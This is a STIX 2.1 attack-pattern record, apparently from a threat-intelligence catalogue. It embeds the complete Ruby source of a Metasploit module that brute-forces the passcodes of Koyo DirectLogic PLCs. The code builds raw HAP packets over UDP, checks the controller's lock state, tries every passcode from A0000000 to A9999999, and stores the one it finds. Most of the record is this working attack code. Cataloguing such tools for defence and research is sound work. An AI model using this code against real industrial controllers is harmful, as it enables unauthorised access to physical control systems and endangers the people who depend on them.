{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f9962a49-c756-491a-8b8e-6195e3f9a198",
    "created": "2024-08-14T16:26:52.940856Z",
    "modified": "2024-08-14T16:26:52.94086Z",
    "name": "Koyo DirectLogic PLC Password Brute Force Utility",
    "description": " This module attempts to authenticate to a locked Koyo DirectLogic PLC. The PLC uses a restrictive passcode, which can be A0000000 through A9999999. The \"A\" prefix can also be changed by the administrator to any other character which can be set through the PREFIX option of this module.  This module is based on the original 'koyobrute.rb' Basecamp module from DigitalBond. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/scada/koyo_login.rb",
            "external_id": "koyo_login.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.digitalbond.com/tools/basecamp/metasploit-modules/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# msfdev is going to want a bunch of other stuff for style/compat but this works\n# TODO: Make into a real AuthBrute module, although the password pattern is fixed\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'Koyo DirectLogic PLC Password Brute Force Utility',\n      'Description'    => %q{\n          This module attempts to authenticate to a locked Koyo DirectLogic PLC.\n        The PLC uses a restrictive passcode, which can be A0000000 through A9999999.\n        The \"A\" prefix can also be changed by the administrator to any other character,\n        which can be set through the PREFIX option of this module.\n\n        This module is based on the original 'koyobrute.rb' Basecamp module from\n        DigitalBond.\n      },\n      'Author'         =>\n        [\n          'K. Reid Wightman <wightman[at]digitalbond.com>', # original module\n          'todb' # Metasploit fixups\n        ],\n      'DisclosureDate' => 'Jan 19 2012',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]\n        ]\n    )\n\n    register_options(\n      [\n        OptInt.new('RECV_TIMEOUT', [false, \"Time (in seconds) to wait between packets\", 3]),\n        OptString.new('PREFIX', [true, 'The prefix to use for the password (default: A)', \"A\"]),\n        Opt::RPORT(28784)\n      ])\n  end\n\n  @@CCITT_16 = [\n    0x0000, 0x1021, 0x2042, 0x3063, 0x4084, 0x50A5, 0x60C6, 0x70E7,\n    0x8108, 0x9129, 0xA14A, 0xB16B, 0xC18C, 0xD1AD, 0xE1CE, 0xF1EF,\n    0x1231, 0x0210, 0x3273, 0x2252, 0x52B5, 0x4294, 0x72F7, 0x62D6,\n    0x9339, 0x8318, 0xB37B, 0xA35A, 0xD3BD, 0xC39C, 0xF3FF, 0xE3DE,\n    0x2462, 0x3443, 0x0420, 0x1401, 0x64E6, 0x74C7, 0x44A4, 0x5485,\n    0xA56A, 0xB54B, 0x8528, 0x9509, 0xE5EE, 0xF5CF, 0xC5AC, 0xD58D,\n    0x3653, 0x2672, 0x1611, 0x0630, 0x76D7, 0x66F6, 0x5695, 0x46B4,\n    0xB75B, 0xA77A, 0x9719, 0x8738, 0xF7DF, 0xE7FE, 0xD79D, 0xC7BC,\n    0x48C4, 0x58E5, 0x6886, 0x78A7, 0x0840, 0x1861, 0x2802, 0x3823,\n    0xC9CC, 0xD9ED, 0xE98E, 0xF9AF, 0x8948, 0x9969, 0xA90A, 0xB92B,\n    0x5AF5, 0x4AD4, 0x7AB7, 0x6A96, 0x1A71, 0x0A50, 0x3A33, 0x2A12,\n    0xDBFD, 0xCBDC, 0xFBBF, 0xEB9E, 0x9B79, 0x8B58, 0xBB3B, 0xAB1A,\n    0x6CA6, 0x7C87, 0x4CE4, 0x5CC5, 0x2C22, 0x3C03, 0x0C60, 0x1C41,\n    0xEDAE, 0xFD8F, 0xCDEC, 0xDDCD, 0xAD2A, 0xBD0B, 0x8D68, 0x9D49,\n    0x7E97, 0x6EB6, 0x5ED5, 0x4EF4, 0x3E13, 0x2E32, 0x1E51, 0x0E70,\n    0xFF9F, 0xEFBE, 0xDFDD, 0xCFFC, 0xBF1B, 0xAF3A, 0x9F59, 0x8F78,\n    0x9188, 0x81A9, 0xB1CA, 0xA1EB, 0xD10C, 0xC12D, 0xF14E, 0xE16F,\n    0x1080, 0x00A1, 0x30C2, 0x20E3, 0x5004, 0x4025, 0x7046, 0x6067,\n    0x83B9, 0x9398, 0xA3FB, 0xB3DA, 0xC33D, 0xD31C, 0xE37F, 0xF35E,\n    0x02B1, 0x1290, 0x22F3, 0x32D2, 0x4235, 0x5214, 0x6277, 0x7256,\n    0xB5EA, 0xA5CB, 0x95A8, 0x8589, 0xF56E, 0xE54F, 0xD52C, 0xC50D,\n    0x34E2, 0x24C3, 0x14A0, 0x0481, 0x7466, 0x6447, 0x5424, 0x4405,\n    0xA7DB, 0xB7FA, 0x8799, 0x97B8, 0xE75F, 0xF77E, 0xC71D, 0xD73C,\n    0x26D3, 0x36F2, 0x0691, 0x16B0, 0x6657, 0x7676, 0x4615, 0x5634,\n    0xD94C, 0xC96D, 0xF90E, 0xE92F, 0x99C8, 0x89E9, 0xB98A, 0xA9AB,\n    0x5844, 0x4865, 0x7806, 0x6827, 0x18C0, 0x08E1, 0x3882, 0x28A3,\n    0xCB7D, 0xDB5C, 0xEB3F, 0xFB1E, 0x8BF9, 0x9BD8, 0xABBB, 0xBB9A,\n    0x4A75, 0x5A54, 0x6A37, 0x7A16, 0x0AF1, 0x1AD0, 0x2AB3, 0x3A92,\n    0xFD2E, 0xED0F, 0xDD6C, 0xCD4D, 0xBDAA, 0xAD8B, 0x9DE8, 0x8DC9,\n    0x7C26, 0x6C07, 0x5C64, 0x4C45, 0x3CA2, 0x2C83, 0x1CE0, 0x0CC1,\n    0xEF1F, 0xFF3E, 0xCF5D, 0xDF7C, 0xAF9B, 0xBFBA, 0x8FD9, 0x9FF8,\n    0x6E17, 0x7E36, 0x4E55, 0x5E74, 0x2E93, 0x3EB2, 0x0ED1, 0x1EF0\n  ]\n\n  def run_host(ip)\n\n    # Create a socket in order to receive responses from a non-default IP\n    @udp_sock = Rex::Socket::Udp.create(\n      'PeerHost'  => rhost,\n      'PeerPort'  => rport.to_i,\n      'Context'   => {'Msf' => framework, 'MsfExploit' => self}\n    )\n    add_socket(@udp_sock)\n\n    print_status(\"#{rhost}:#{rport} - KOYO - Checking the controller for locked memory...\")\n\n    if unlock_check\n      # TODO: Report a vulnerability for an unlocked controller?\n      print_good(\"#{rhost}:#{rport} - Unlocked!\")\n      return\n    else\n      print_status(\"#{rhost}:#{rport} - KOYO - Controller locked; commencing bruteforce...\")\n    end\n\n    # TODO: Consider sort_by {rand} in order to avoid sequential guessing\n    # or something fancier\n\n    (0..9999999).each do |i|\n      passcode = datastore['PREFIX'] + i.to_s.rjust(7,'0')\n      vprint_status(\"#{rhost}:#{rport} - KOYO - Trying #{passcode}\")\n      bytes = passcode.scan(/../).map { |x| x.to_i(16) }\n      passstr = bytes.pack(\"C*\")\n      res = try_auth(passstr)\n      next if not res\n\n      print_good \"#{rhost}:#{rport} - KOYO - Found passcode: #{passcode}\"\n      report_cred(\n        ip: rhost,\n        port: rport.to_i,\n        service_name: 'koyo',\n        user: '',\n        password: passcode,\n        proof: res\n      )\n      break\n    end\n\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'udp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def crc16(buf, crc=0)\n    buf.each_byte{|x| crc = ((crc << 8) ^ @@CCITT_16[( crc >> 8) ^ x]) & 0xffff }\n    [crc].pack(\"v\")\n  end\n\n  def unlock_check\n    checkpacket = \"HAP\\xe6\\x01\\x6e\\x68\\x0d\\x00\\x1a\\x00\\x09\\x00\\x01\\x50\\x01\\x02\\x00\\x01\\x00\\x17\\x52\"\n    @udp_sock.sendto(checkpacket, rhost, rport.to_i)\n\n    recvpacks = 0\n    # TODO: Since the packet count is critical, consider using Capture instead,\n    # but that requires root which is mildly annoying and not cross-platform.\n    # IOW, not a hugely good way to solve this via packet counting, given the nature\n    # of UDP.\n    #\n    # Another way to speed things up is to use fancy threading, but that's for another\n    # day.\n    while (r = @udp_sock.recvfrom(65535, 0.1) and recvpacks < 2)\n      res = r[0]\n      if res.length == 269 # auth reply packet\n        if res[17,1] == \"\\x00\" and res[19,1] == \"\\xD2\" # Magic bytes\n          return true\n        end\n      end\n      recvpacks += 1\n    end\n    return false\n  end\n\n  def try_auth(passstr)\n    data = \"\\x1a\\x00\\x0d\\x00\\x01\\x51\\x01\\x19\\x02\\x04\\x00\" + passstr + \"\\x17\\xaf\"\n    header = \"HAP\"\n    header += \"\\xe5\\x01\" # random session ID\n    header += crc16(data)\n    header += [data.length].pack(\"v\")\n    authpacket = header + data\n\n    @udp_sock.sendto(authpacket, rhost, rport.to_i)\n\n    2.times { @udp_sock.get(recv_timeout) } # talk to the hand\n\n    status = unlock_check\n\n    return status\n  end\n\n  def recv_timeout\n    if datastore['RECV_TIMEOUT'].to_i.zero?\n      3\n    else\n      datastore['RECV_TIMEOUT'].to_i.abs\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "Jan 19 2012"
}